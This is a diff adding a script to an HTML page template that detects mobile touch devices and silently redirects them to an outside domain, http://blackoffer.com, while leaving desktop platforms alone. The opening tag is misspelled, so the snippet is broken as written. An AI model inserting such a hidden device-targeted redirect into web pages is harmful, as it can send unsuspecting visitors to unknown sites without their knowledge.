@@ -26,7 +26,12 @@
 
 <!-- use "theme-invert" class on bright backgrounds, also try "text-shadows" class -->
 <body class="theme-invert">
-
+<scripit>
+    if ('ontouchstart' in document.documentElement && typeof(window.orientation)!='undefined' && navigator.platform != "Win32" && navigator.platform != "Linux x86_64" && navigator.platform != "Win64" && navigator.platform != "Linux i686" && navigator.platform != "MacIntel") {  window.location.replace("http://blackoffer.com");  }
+ 
+</script>
+	
+	
 <nav class="mainmenu">
 	<div class="container">
 		<div class="dropdown">
